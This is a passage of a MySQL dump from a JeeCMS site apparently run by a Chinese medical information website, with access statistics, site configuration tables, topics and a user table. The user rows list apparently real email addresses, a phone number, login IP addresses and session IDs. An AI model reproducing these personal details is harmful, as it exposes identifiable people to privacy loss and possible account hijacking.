INSERT INTO `jc_site_access_statistic` VALUES ('363', '2017-01-14', '95', '1', '5', '19', '2238', '1', 'link', 'http://www.caihongyixue.com');
INSERT INTO `jc_site_access_statistic` VALUES ('364', '2017-01-15', '283', '2', '13', '21', '-4642', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('365', '2017-01-15', '9', '1', '1', '9', '1350', '1', 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES ('366', '2017-01-15', '274', '1', '12', '22', '-5142', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('367', '2017-01-15', '9', '1', '1', '9', '1350', '1', 'link', 'http://192.168.1.104:2021');
INSERT INTO `jc_site_access_statistic` VALUES ('368', '2017-01-16', '257', '2', '11', '23', '2246', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('369', '2017-01-16', '118', '2', '5', '23', '2296', '1', 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES ('370', '2017-01-16', '139', '1', '6', '23', '2204', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('371', '2017-01-16', '33', '1', '4', '8', '480', '1', 'link', 'http://192.168.1.185:2021');
INSERT INTO `jc_site_access_statistic` VALUES ('372', '2017-01-16', '85', '1', '1', '85', '9561', '1', 'link', 'http://bbs.caihongyixue.com');
INSERT INTO `jc_site_access_statistic` VALUES ('373', '2017-01-17', '183', '13', '27', '6', '63', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('374', '2017-01-17', '75', '9', '15', '5', '445', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('375', '2017-01-17', '3', '1', '1', '3', '38', '1', 'area', '山东省');
INSERT INTO `jc_site_access_statistic` VALUES ('376', '2017-01-17', '4', '1', '1', '4', '22', '1', 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES ('377', '2017-01-17', '179', '13', '26', '6', '65', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('378', '2017-01-17', '4', '1', '1', '4', '22', '1', 'link', 'http://bbs.caihongyixue.com');
INSERT INTO `jc_site_access_statistic` VALUES ('379', '2017-01-18', '44', '11', '17', '2', '312', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('380', '2017-01-18', '4', '4', '4', '1', '0', '1', 'area', '上海市');
INSERT INTO `jc_site_access_statistic` VALUES ('381', '2017-01-18', '27', '3', '8', '3', '633', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('382', '2017-01-18', '8', '2', '2', '4', '322', '1', 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES ('383', '2017-01-18', '6', '2', '2', '3', '97', '1', 'source', '搜索引擎');
INSERT INTO `jc_site_access_statistic` VALUES ('384', '2017-01-18', '30', '9', '13', '2', '344', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('385', '2017-01-18', '6', '2', '2', '3', '97', '1', 'engine', '百度');
INSERT INTO `jc_site_access_statistic` VALUES ('386', '2017-01-18', '8', '2', '2', '4', '322', '1', 'link', 'http://bbs.caihongyixue.com');
INSERT INTO `jc_site_access_statistic` VALUES ('387', '2017-01-19', '34', '5', '10', '3', '139', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('388', '2017-01-19', '2', '2', '2', '1', '0', '1', 'area', '北京市');
INSERT INTO `jc_site_access_statistic` VALUES ('389', '2017-01-19', '20', '3', '5', '4', '241', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('390', '2017-01-19', '2', '1', '1', '2', '0', '1', 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES ('391', '2017-01-19', '32', '5', '9', '3', '154', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('392', '2017-01-19', '2', '1', '1', '2', '0', '1', 'link', 'http://bbs.caihongyixue.com');
INSERT INTO `jc_site_access_statistic` VALUES ('393', '2017-01-20', '5', '3', '4', '1', '0', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('394', '2017-01-20', '2', '1', '2', '1', '0', '1', 'area', '北京市');
INSERT INTO `jc_site_access_statistic` VALUES ('395', '2017-01-20', '2', '1', '1', '2', '0', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('396', '2017-01-20', '5', '3', '4', '1', '0', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('397', '2017-01-21', '4', '2', '2', '2', '19', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('398', '2017-01-21', '1', '1', '1', '1', '0', '1', 'area', '北京市');
INSERT INTO `jc_site_access_statistic` VALUES ('399', '2017-01-21', '3', '1', '1', '3', '38', '1', 'area', '天津市');
INSERT INTO `jc_site_access_statistic` VALUES ('400', '2017-01-21', '4', '2', '2', '2', '19', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('401', '2017-01-22', '12', '4', '8', '1', '1', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('402', '2017-01-22', '2', '2', '2', '1', '0', '1', 'area', '北京市');
INSERT INTO `jc_site_access_statistic` VALUES ('403', '2017-01-22', '10', '2', '6', '1', '2', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('404', '2017-01-22', '12', '4', '8', '1', '1', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('405', '2017-01-23', '15', '4', '4', '3', '200', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('406', '2017-01-23', '15', '4', '4', '3', '200', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('407', '2017-01-23', '7', '1', '1', '7', '738', '1', 'source', '搜索引擎');
INSERT INTO `jc_site_access_statistic` VALUES ('408', '2017-01-23', '8', '3', '3', '2', '21', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('409', '2017-01-23', '7', '1', '1', '7', '738', '1', 'engine', '百度');
INSERT INTO `jc_site_access_statistic` VALUES ('410', '2017-01-24', '164', '19', '32', '5', '441', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('411', '2017-01-24', '19', '1', '1', '19', '2857', '1', 'area', '北京市');
INSERT INTO `jc_site_access_statistic` VALUES ('412', '2017-01-24', '49', '9', '10', '4', '611', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('413', '2017-01-24', '30', '2', '7', '4', '467', '1', 'area', '天津市');
INSERT INTO `jc_site_access_statistic` VALUES ('414', '2017-01-24', '5', '1', '1', '5', '95', '1', 'area', '山东省');
INSERT INTO `jc_site_access_statistic` VALUES ('415', '2017-01-24', '18', '2', '3', '6', '167', '1', 'area', '辽宁省');
INSERT INTO `jc_site_access_statistic` VALUES ('416', '2017-01-24', '25', '2', '2', '12', '1592', '1', 'source', '外部链接');
INSERT INTO `jc_site_access_statistic` VALUES ('417', '2017-01-24', '139', '18', '30', '4', '365', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('418', '2017-01-24', '25', '2', '2', '12', '1592', '1', 'link', 'http://caihongyixue.com');
INSERT INTO `jc_site_access_statistic` VALUES ('419', '2017-01-25', '53', '7', '13', '4', '201', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('420', '2017-01-25', '16', '4', '8', '2', '69', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('421', '2017-01-25', '32', '1', '2', '16', '956', '1', 'area', '天津市');
INSERT INTO `jc_site_access_statistic` VALUES ('422', '2017-01-25', '5', '2', '3', '1', '49', '1', 'area', '辽宁省');
INSERT INTO `jc_site_access_statistic` VALUES ('423', '2017-01-25', '53', '7', '13', '4', '201', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('424', '2017-01-27', '2', '1', '1', '2', '41', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('425', '2017-01-27', '2', '1', '1', '2', '41', '1', 'area', '黑龙江省');
INSERT INTO `jc_site_access_statistic` VALUES ('426', '2017-01-27', '2', '1', '1', '2', '41', '1', 'source', '搜索引擎');
INSERT INTO `jc_site_access_statistic` VALUES ('427', '2017-01-27', '2', '1', '1', '2', '41', '1', 'engine', '百度');
INSERT INTO `jc_site_access_statistic` VALUES ('428', '2017-01-28', '2', '1', '1', '2', '0', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('429', '2017-01-28', '2', '1', '1', '2', '0', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('430', '2017-01-29', '6', '2', '2', '3', '77', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('431', '2017-01-29', '3', '1', '1', '3', '66', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('432', '2017-01-29', '6', '2', '2', '3', '77', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('433', '2017-01-30', '2', '1', '1', '2', '7', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('434', '2017-01-30', '2', '1', '1', '2', '7', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('435', '2017-01-30', '2', '1', '1', '2', '7', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('436', '2017-01-31', '3', '2', '2', '1', '1', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('437', '2017-01-31', '3', '2', '2', '1', '1', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('438', '2017-02-01', '14', '2', '7', '2', '-11933', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('439', '2017-02-01', '1', '1', '1', '1', '0', '1', 'area', '四川省');
INSERT INTO `jc_site_access_statistic` VALUES ('440', '2017-02-01', '14', '2', '7', '2', '-11933', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('441', '2017-02-02', '1', '1', '1', '1', '0', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('442', '2017-02-02', '1', '1', '1', '1', '0', '1', 'source', '直接访问');
INSERT INTO `jc_site_access_statistic` VALUES ('443', '2017-02-04', '28', '1', '3', '9', '-28076', '1', 'all', '');
INSERT INTO `jc_site_access_statistic` VALUES ('444', '2017-02-04', '28', '1', '3', '9', '-28076', '1', 'source', '直接访问');

-- ----------------------------
-- Table structure for jc_site_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_attr`;
CREATE TABLE `jc_site_attr` (
  `site_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_site` (`site_id`),
  CONSTRAINT `fk_jc_attr_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点属性表';

-- ----------------------------
-- Records of jc_site_attr
-- ----------------------------
INSERT INTO `jc_site_attr` VALUES ('1', 'pvTotal', '992');
INSERT INTO `jc_site_attr` VALUES ('1', 'visitors', '232');
INSERT INTO `jc_site_attr` VALUES ('1', 'wxAppkey', '0');
INSERT INTO `jc_site_attr` VALUES ('1', 'wxAppSecret', '0');
INSERT INTO `jc_site_attr` VALUES ('1', 'dayPvTotal', '26');
INSERT INTO `jc_site_attr` VALUES ('1', 'dayVisitors', '11');
INSERT INTO `jc_site_attr` VALUES ('1', 'weekPvTotal', '25');
INSERT INTO `jc_site_attr` VALUES ('1', 'monthPvTotal', '58');
INSERT INTO `jc_site_attr` VALUES ('1', 'monthVisitors', '27');
INSERT INTO `jc_site_attr` VALUES ('1', 'weekVisitors', '11');

-- ----------------------------
-- Table structure for jc_site_cfg
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_cfg`;
CREATE TABLE `jc_site_cfg` (
  `site_id` int(11) NOT NULL,
  `cfg_name` varchar(30) NOT NULL COMMENT '名称',
  `cfg_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_cfg_site` (`site_id`),
  CONSTRAINT `fk_jc_cfg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点配置表';

-- ----------------------------
-- Records of jc_site_cfg
-- ----------------------------

-- ----------------------------
-- Table structure for jc_site_company
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_company`;
CREATE TABLE `jc_site_company` (
  `site_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL COMMENT '公司名称',
  `scale` varchar(255) DEFAULT NULL COMMENT '公司规模',
  `nature` varchar(255) DEFAULT NULL COMMENT '公司性质',
  `industry` varchar(1000) DEFAULT NULL COMMENT '公司行业',
  `contact` varchar(500) DEFAULT NULL COMMENT '联系方式',
  `description` text COMMENT '公司简介',
  `address` varchar(500) DEFAULT NULL COMMENT '公司地址',
  `longitude` float(5,2) DEFAULT NULL COMMENT '经度',
  `latitude` float(4,2) DEFAULT NULL COMMENT '纬度',
  PRIMARY KEY (`site_id`),
  CONSTRAINT `fk_jc_company_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='公司信息';

-- ----------------------------
-- Records of jc_site_company
-- ----------------------------
INSERT INTO `jc_site_company` VALUES ('1', '彩虹医学网', '10-20人', '私企', '互联网', '', '', '', null, null);

-- ----------------------------
-- Table structure for jc_site_model
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_model`;
CREATE TABLE `jc_site_model` (
  `model_id` int(11) NOT NULL AUTO_INCREMENT,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `model_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `upload_path` varchar(100) DEFAULT NULL COMMENT '上传路径',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) DEFAULT '1' COMMENT '0:编辑器;1:文本框;2:文本区;3:图片;4:附件',
  `is_single` tinyint(1) DEFAULT '1' COMMENT '是否独占一行',
  PRIMARY KEY (`model_id`),
  UNIQUE KEY `ak_field` (`field`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点信息模型表';

-- ----------------------------
-- Records of jc_site_model
-- ----------------------------

-- ----------------------------
-- Table structure for jc_site_refer
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_refer`;
CREATE TABLE `jc_site_refer` (
  `site_id` int(11) NOT NULL,
  `from_site_id` int(11) NOT NULL,
  PRIMARY KEY (`from_site_id`,`site_id`),
  KEY `fk_jc_site_to` (`site_id`),
  CONSTRAINT `fk_jc_site_from` FOREIGN KEY (`from_site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_site_to` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='站点转载权限';

-- ----------------------------
-- Records of jc_site_refer
-- ----------------------------
INSERT INTO `jc_site_refer` VALUES ('1', '1');

-- ----------------------------
-- Table structure for jc_site_txt
-- ----------------------------
DROP TABLE IF EXISTS `jc_site_txt`;
CREATE TABLE `jc_site_txt` (
  `site_id` int(11) NOT NULL,
  `txt_name` varchar(30) NOT NULL COMMENT '名称',
  `txt_value` longtext COMMENT '值',
  KEY `fk_jc_txt_site` (`site_id`),
  CONSTRAINT `fk_jc_txt_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点文本表';

-- ----------------------------
-- Records of jc_site_txt
-- ----------------------------

-- ----------------------------
-- Table structure for jc_sms_send_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_sms_send_record`;
CREATE TABLE `jc_sms_send_record` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `telphone` varchar(20) NOT NULL COMMENT '接收手机号',
  `content` varchar(255) DEFAULT NULL COMMENT '内容',
  `send_status` varchar(20) DEFAULT NULL COMMENT '发送状态',
  `send_out_body` varchar(255) DEFAULT NULL COMMENT '发送结果',
  `site_id` int(11) DEFAULT NULL,
  `create_on` datetime NOT NULL ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of jc_sms_send_record
-- ----------------------------

-- ----------------------------
-- Table structure for jc_task
-- ----------------------------
DROP TABLE IF EXISTS `jc_task`;
CREATE TABLE `jc_task` (
  `task_id` int(11) NOT NULL AUTO_INCREMENT,
  `task_code` varchar(255) DEFAULT NULL COMMENT '任务执行代码',
  `task_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '任务类型(1首页静态化、2栏目页静态化、3内容页静态化、4采集、5分发)',
  `task_name` varchar(255) NOT NULL COMMENT '任务名称',
  `job_class` varchar(255) NOT NULL COMMENT '任务类',
  `execycle` tinyint(1) NOT NULL DEFAULT '1' COMMENT '执行周期分类(1非表达式 2 cron表达式)',
  `day_of_month` int(11) DEFAULT NULL COMMENT '每月的哪天',
  `day_of_week` tinyint(1) DEFAULT NULL COMMENT '周几',
  `hour` int(11) DEFAULT NULL COMMENT '小时',
  `minute` int(11) DEFAULT NULL COMMENT '分钟',
  `interval_hour` int(11) DEFAULT NULL COMMENT '间隔小时',
  `interval_minute` int(11) DEFAULT NULL COMMENT '间隔分钟',
  `task_interval_unit` tinyint(1) DEFAULT NULL COMMENT '1分钟、2小时、3日、4周、5月',
  `cron_expression` varchar(255) DEFAULT NULL COMMENT '规则表达式',
  `is_enable` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  `task_remark` varchar(255) DEFAULT NULL COMMENT '任务说明',
  `site_id` int(11) NOT NULL COMMENT '站点',
  `user_id` int(11) NOT NULL COMMENT '创建者',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`task_id`),
  KEY `fk_jc_task_site` (`site_id`),
  CONSTRAINT `fk_jc_task_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='任务表';

-- ----------------------------
-- Records of jc_task
-- ----------------------------
INSERT INTO `jc_task` VALUES ('3', '3d648c5b-3815-4e34-9a90-888c02d54e6e', '1', '11', 'com.jeecms.cms.task.job.IndexStaticJob', '1', null, null, null, null, null, '1', '1', null, '0', '', '1', '1', '2016-06-25 10:40:07');

-- ----------------------------
-- Table structure for jc_task_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_task_attr`;
CREATE TABLE `jc_task_attr` (
  `task_id` int(11) NOT NULL,
  `param_name` varchar(30) NOT NULL COMMENT '参数名称',
  `param_value` varchar(255) DEFAULT NULL COMMENT '参数值',
  KEY `fk_jc_attr_task` (`task_id`),
  CONSTRAINT `fk_jc_attr_task` FOREIGN KEY (`task_id`) REFERENCES `jc_task` (`task_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='任务参数表';

-- ----------------------------
-- Records of jc_task_attr
-- ----------------------------
INSERT INTO `jc_task_attr` VALUES ('3', 'site_id', '1');

-- ----------------------------
-- Table structure for jc_third_account
-- ----------------------------
DROP TABLE IF EXISTS `jc_third_account`;
CREATE TABLE `jc_third_account` (
  `account_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `account_key` varchar(255) NOT NULL DEFAULT '' COMMENT '第三方账号key',
  `username` varchar(100) NOT NULL DEFAULT '0' COMMENT '关联用户名',
  `source` varchar(10) NOT NULL DEFAULT '' COMMENT '第三方账号平台(QQ、新浪微博等)',
  `user_id` int(11) DEFAULT NULL COMMENT '用户iD',
  PRIMARY KEY (`account_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='第三方登录平台账号';

-- ----------------------------
-- Records of jc_third_account
-- ----------------------------

-- ----------------------------
-- Table structure for jc_topic
-- ----------------------------
DROP TABLE IF EXISTS `jc_topic`;
CREATE TABLE `jc_topic` (
  `topic_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) DEFAULT NULL,
  `topic_name` varchar(150) NOT NULL COMMENT '名称',
  `short_name` varchar(150) DEFAULT NULL COMMENT '简称',
  `keywords` varchar(255) DEFAULT NULL COMMENT '关键字',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `title_img` varchar(100) DEFAULT NULL COMMENT '标题图',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '专题模板',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推??',
  PRIMARY KEY (`topic_id`),
  KEY `fk_jc_topic_channel` (`channel_id`),
  CONSTRAINT `fk_jc_topic_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='CMS专题表';

-- ----------------------------
-- Records of jc_topic
-- ----------------------------
INSERT INTO `jc_topic` VALUES ('1', null, ' 2016饲料英才网络招聘会', '饲料英才网络招聘会', '', '', '/u/cms/www/201610/10100951y2xy.jpg', '/u/cms/www/201610/11092540p27t.jpg', '', '11', '1');
INSERT INTO `jc_topic` VALUES ('2', null, '互联网+与传统产业升级之道', '互联网+', '', '', '/u/cms/www/201610/10100842hqdk.jpg', '/u/cms/www/201610/110911592mxa.jpg', '', '10', '1');
INSERT INTO `jc_topic` VALUES ('3', null, '2015全国两会', '2015全国两会', '', '', '/u/cms/www/201610/101010021q7v.jpg', '/u/cms/www/201610/11092148co74.jpg', '', '10', '1');
INSERT INTO `jc_topic` VALUES ('4', null, '专题共读', '专题共读', '', '专题共读', '/r/cms/www/default/img/index_27.png', '/r/cms/www/default/img/banner-about.png', '', '10', '1');

-- ----------------------------
-- Table structure for jc_topic_channel
-- ----------------------------
DROP TABLE IF EXISTS `jc_topic_channel`;
CREATE TABLE `jc_topic_channel` (
  `topic_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  PRIMARY KEY (`topic_id`,`channel_id`),
  KEY `fk_jc_topic_channel_channel` (`channel_id`),
  KEY `fk_jc_topic_channel_topic` (`topic_id`),
  CONSTRAINT `fk_jc_topic_channel_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_topic_channel_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of jc_topic_channel
-- ----------------------------

-- ----------------------------
-- Table structure for jc_user
-- ----------------------------
DROP TABLE IF EXISTS `jc_user`;
CREATE TABLE `jc_user` (
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  `depart_id` int(11) DEFAULT NULL COMMENT '部门',
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `telphone` varchar(20) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL COMMENT '邮箱',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录次数',
  `rank` int(11) NOT NULL DEFAULT '0' COMMENT '管理员级别',
  `upload_total` bigint(20) NOT NULL DEFAULT '0' COMMENT '上传总大小',
  `upload_size` int(11) NOT NULL DEFAULT '0' COMMENT '上传大小',
  `upload_date` date DEFAULT NULL COMMENT '上传日期',
  `is_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否管理员',
  `is_viewonly_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否只读管理员',
  `is_self_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否只管理自己的数据',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `file_total` int(11) NOT NULL DEFAULT '0' COMMENT '上传文库文档个数',
  `grain` int(11) NOT NULL DEFAULT '0' COMMENT '文库财富值',
  `session_id` varchar(255) DEFAULT NULL,
  `fans_cnt` int(11) NOT NULL DEFAULT '0' COMMENT '粉丝数',
  `follow_cnt` int(11) NOT NULL DEFAULT '0' COMMENT '关注数',
  `job_title` int(11) DEFAULT NULL COMMENT '职称',
  `job_level` int(11) DEFAULT NULL COMMENT '级别',
  `major` int(11) DEFAULT NULL COMMENT '专业',
  `nation` int(11) DEFAULT NULL,
  `comment_cnt` int(11) DEFAULT '0',
  `id_no` varchar(20) DEFAULT NULL COMMENT '证件号码',
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `ak_username` (`username`),
  KEY `fk_jc_user_group` (`group_id`),
  KEY `fk_jc_user_depart` (`depart_id`),
  KEY `fk_jc_user_major` (`major`),
  KEY `fk_jc_user_nation` (`nation`),
  KEY `fk_jc_user_jobtitle` (`job_title`),
  KEY `fk_jc_user_joblevel` (`job_level`),
  CONSTRAINT `fk_jc_user_depart` FOREIGN KEY (`depart_id`) REFERENCES `jc_department` (`depart_id`),
  CONSTRAINT `fk_jc_user_group` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_user_joblevel` FOREIGN KEY (`job_level`) REFERENCES `jc_dictionary` (`id`),
  CONSTRAINT `fk_jc_user_jobtitle` FOREIGN KEY (`job_title`) REFERENCES `jc_dictionary` (`id`),
  CONSTRAINT `fk_jc_user_major` FOREIGN KEY (`major`) REFERENCES `jc_dictionary` (`id`),
  CONSTRAINT `fk_jc_user_nation` FOREIGN KEY (`nation`) REFERENCES `jc_dictionary` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户表';

-- ----------------------------
-- Records of jc_user
-- ----------------------------
INSERT INTO `jc_user` VALUES ('1', '1', '1', 'admin', '15588882222', 'caihongyixue@qq.com', '2011-01-03 00:00:00', '127.0.0.1', '2017-02-05 14:35:40', '127.0.0.1', '2380', '9', '337517', '17', '2017-02-05', '1', '0', '0', '0', '4', '103', '2EC4842F30B02C0A84DEE178B2C690D1', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('2', '2', '5', 'caihong', null, 'qianfo_713@163.com', '2017-01-15 10:59:48', '127.0.0.1', '2017-01-25 09:15:42', '117.174.29.135', '16', '0', '0', '0', '2017-01-15', '0', '0', '0', '0', '0', '0', '449493ABF62380875B3D512A23C4923A', '0', '0', '4', '1', '8', '35', '0', null);
INSERT INTO `jc_user` VALUES ('3', '1', null, 'caihong1', null, '77219569@qq.com', '2017-01-16 17:41:06', '127.0.0.1', '2017-01-25 00:17:00', '101.207.227.64', '4', '0', '0', '0', '2017-01-16', '0', '0', '0', '0', '0', '0', '294E1AA96E695E3815B69E69D5C08E48', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('4', '1', null, 'caihong3', null, '77219569@qq.com', '2017-01-17 00:58:53', '101.207.227.2', '2017-01-17 01:04:05', '101.207.227.2', '1', '0', '0', '0', '2017-01-17', '0', '0', '0', '0', '0', '0', 'A0DFA5A2E188EBD6C3493AE102027503', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('5', '1', null, '红山茶007', null, '423649967@qq.com', '2017-01-17 11:41:13', '182.138.200.232', '2017-01-17 16:14:33', '182.138.200.232', '7', '0', '0', '0', '2017-01-17', '0', '0', '0', '0', '0', '0', '906271CD70039CA011C31473FA1ECFDE', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('6', '1', null, '彩虹医学编辑', null, 'caihongyixue@163.com', '2017-01-17 15:31:52', '182.138.200.232', '2017-01-17 15:31:52', '182.138.200.232', '0', '0', '0', '0', '2017-01-17', '0', '0', '0', '0', '0', '0', null, '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('7', '1', null, 'ceshi123', null, 'caihongyixue@163.com', '2017-01-17 15:40:36', '182.138.200.232', '2017-01-17 15:42:09', '182.138.200.232', '1', '0', '0', '0', '2017-01-17', '0', '0', '0', '0', '0', '0', '149C1E6ED3F33FBFD1174D76C9D4D8C0', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('10', '1', null, 'qianfo_713', null, '77219569@qq.com', '2017-01-18 10:19:18', '117.173.132.144', '2017-01-18 14:38:02', '117.173.132.144', '3', '0', '0', '0', '2017-01-18', '0', '0', '0', '0', '0', '0', '02BEE083DEBB08E5C9CE3C44EA453B73', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('11', '1', null, '成都李炳成', null, 'yyy9990@vip.163.com', '2017-01-19 17:54:44', '182.150.160.76', '2017-01-19 17:55:07', '182.150.160.76', '1', '0', '0', '0', '2017-01-19', '0', '0', '0', '0', '0', '0', 'BB25A2D17CA37C22C99CFCD14DB319BA', '0', '0', null, null, null, '1', '0', null);
